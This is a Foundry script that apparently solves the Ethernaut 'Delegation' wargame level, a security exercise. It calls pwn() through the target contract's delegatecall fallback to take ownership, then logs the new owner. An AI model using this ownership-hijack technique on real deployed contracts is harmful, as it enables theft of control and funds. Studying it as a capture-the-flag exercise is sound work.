// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Delegation} from "../src/Level06.sol";

contract DelegationScript is Script {
    Delegation public delegationInstance;

    function setUp() public {
        delegationInstance = Delegation(0xd0b34638B08106b5C3a9DdD78D79c8928c64b1E6);
    }

    function run() public {
        vm.startBroadcast();

        (bool success,) = address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        require(success, "Failed delegate");

        console.log(delegationInstance.owner());

        vm.stopBroadcast();
    }
}
